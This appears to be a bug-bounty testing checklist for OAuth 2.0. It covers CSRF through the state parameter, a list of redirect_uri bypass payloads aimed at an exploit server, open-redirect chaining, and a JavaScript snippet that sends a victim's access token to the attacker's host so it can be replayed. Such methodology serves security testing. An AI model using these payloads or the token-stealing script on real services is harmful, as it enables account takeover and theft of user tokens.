# OAuth 2.0 Testing Checklist

Start by creating two accounts on your target of choice. Let's call one victim and one attacker. 

## Recon

1) Once you've located an OAuth flow on the app, connect one of your accounts and make sure the flow get's captured in the history. What kind of flow is it using? Code grant, or implicit grant? Something else?
2) If you find that it's using the Implicit Grant flow, try to identify the POST request which sends the credentials. Can you modify the email to your victim account and get connecting to their account instead of yours? If not, move on. 
3) Check to see if `/.well-known/oauth-authorization-server` or `/.well-known/openid-configuration` endpoints exist on the OAuth provider (not the content provider). This may give you key information in a JSON response body. Save anything interesting you may find and move on. 

## Testing for CSRF account takeover

1) Check to see if there's a state= parameter. If not, you may be able to initiate an OAuth CSRF. **I believe this is only applicable if you can sign in via email/password OR linking a social media account. You need a way to create an attacker account but still have an option to link a social media profile to it.**
	 - Create an account using your attacker's email and a password. Do not link a social media profile. Do the same for the victim account. 
	 - Locate where you can link a social media profile and initiate the flow, making sure Intercept is on in the Burp Proxy. 
	 - Once you arrive at the request containing all the OAuth parameters, send it to Repeater, drop the request, and stop capturing traffic in the proxy.
	 - Now make the captured request with your victim instead of the attacker who initiated the flow. 
	 - Try logging in again as the attacker and see if you have access to the victim's account. If so, bingo. **Keep in mind that for this to work you would need a victim account to also have created an account via password and not have linked a social media profile yet. The idea is getting your social media account associated with their password-based account.**
2) Even if the state= parameter exists, try the same steps as above, but remove the parameter. Perhaps if it's removed it will simply be ignored.Try a third time but the value of the state parameter by one char. Maybe it's not actually validating the state parameter. In either case you found a vulnerable instance.

	**If the only option to log in is via OAuth, the state parameter is less critical, but you may be able to trick a victim into logging in to your account. YMMV**

## Testing the redirect_uri

In this example, we will use http://wearelucid.io as the exploit server. 

1) Authenticate your victim email to the application via OAuth. This attack only works on victims who have valid OAuth credentials. Make sure you take note of all requests and responses, especially the one that sends to code to the OAuth provider. You'll need to manually make this request as the attacker in order to complete the exploit. 
2) As the victim try signing in via OAuth and intercepting the OAuth request containing the request_uri parameter. Send it to the Repeater, drop the request in the Proxy and stop intercepting.
3) Begin testing the validation of the request_uri parameter. Try these tests...
	- Changing the value of the request_uri parameter to an entirely different server that you control (Burp collaborator or a VPS) but with the same oauth directory
	- Try keeping the original redirect_uri, but appending a second one with your exploit server `redirect_uri=https://valid.server.com/oath-callback&redirect_uri=http://wearelucid.io/oauth-callback`
	- Try appending values onto the end of the valid redirect uri parameter. Typical SSRF bypasses are good to try...
		```
		redirect_uri=https://valid.server.com/oauth-callback&http://wearelucid.io
		redirect_uri=https://valid.server.com/oauth-callback#http://wearelucid.io
		redirect_uri=https://valid.server.com/oauth-callback?http://wearelucid.io
		redirect_uri=https://valid.server.com/oauth-callback;http://wearelucid.io
		redirect_uri=https://valid.server.com/oauth-callback@http://wearelucid.io
		redirect_uri=https://valid.server.com/oauth-callback.http://wearelucid.io
		```
		or combinations of the above as well
    - Try reversing the above combinations e.g
    ```
    redirect_uri=https://wearelucid.io/oauth-callback&@https://valid.server.com
    ```
    - Attempt to configure a subdomain on your attack server with the name of the valid server e.g.
	```
	redirect_uri=http://valid.server.com.wearelucid.io/oauth-callback
	```
    - On the off chance that any URI with localhost in it's name is allowed, try this as well
```
	redirect_uri=http://localhost.wearelucid.io/oauth-callback
```
4) In addition to the above tests, try changing the response_mode= parameter from query to fragment, or vice versa. You may run into an entirely different validation schema in different modes. For example if you try the response_mode=web_message value, a wider range of subdomains may be allowed in the redirect_uri parameter. If you're feeling ambitious, go through the above bypasses again to see if there is any difference. 

**To prove exploitation**
1) If any of those work, initate an OAuth flow as your victim, capture the request containing the redirect_uri parameter, send it to the repeater, drop the request and stop intercepting. Then, as your victim in a different browser, visit the maliciously crafted URL
2) View your access log on your exploit server to see the stolen code the victim sent to you. As the attacker, copy the code and manually make the request that sends the code to the OAuth provider. Observe that you've logged in as the victim. Good job. 


## Stealing tokens and codes

If none of those bypasses work then the URI validation seems to be solid. At this point you'll want to try directory traversal methods and open redirect chaining. 

1) Try the proper redirect_uri= value, but with a directory traversal to another directory on the same server.
```
	redirect_uri=https://valid.server.com/oauth-callback/../some/other/directory
```
2) If that doesn't give you an error it's time to start looking for an open redirect vulnerability, or a URL with a GET parameter that has a reflected XSS on the same host. In the case of an open redirect...
	-  If authorization code, you should be able to just redirect to your own server and in your logs you wll see the code=value
	- If implicit grant you actually have a little more work to do. You will need to host code that extracts the URL fragment because it won't show up in logs. As an example...
	```javascript
	if(!window.location.hash) { 
		document.location = 'https://oauth.server.com/auth?client_id=[id]&redirect_uri=https://valid.server.com/oauth-callback/../open/redirect?path=https://wearelucid.io/exploit.html&response_type=token&nonce=[nonce]&scope=openid%20profile%20email' 
	} else { 
		window.location = '/?hash='+document.location.hash.substr(1) 
	}
	```

**To prove exploitation** 

If it's authorization code flow....

1) As the victim in a different browser, manually visit the vulnerable OAuth request https://oauth.server.com/auth?client_id=[id]&redirect_uri=https://valid.server.com/oauth-callback/../open/redirect?path=https://wearelucid.io/exploit.html&response_type=token&nonce=[nonce]&scope=openid%20profile%20email. You should see the code come through in your exploit server log. 
2) As the attacker in a separate browser or tab, send the code you stole to the OAuth provider: https://oauth.server.com/oauth-callback?code=(stolen_code)

If it's implicit grant....

1) Host the above Javascript code on your exploit server (or whatever code you deem works in this situation). 
2) Manually visit the same vulnerable OAuth request as the victim. You should see the access token in the exploit server logs.
3) As the attacker, try to make a request that only the logged in victim should be able to see the response to. Add the stolen code in the `Authorization: Bearer (stolen_code)` header to observer gaining unauthorized access to sensitive functionality.


### Resources

[Resources](https://github.com/djislucid/Methodology/Resources.md)
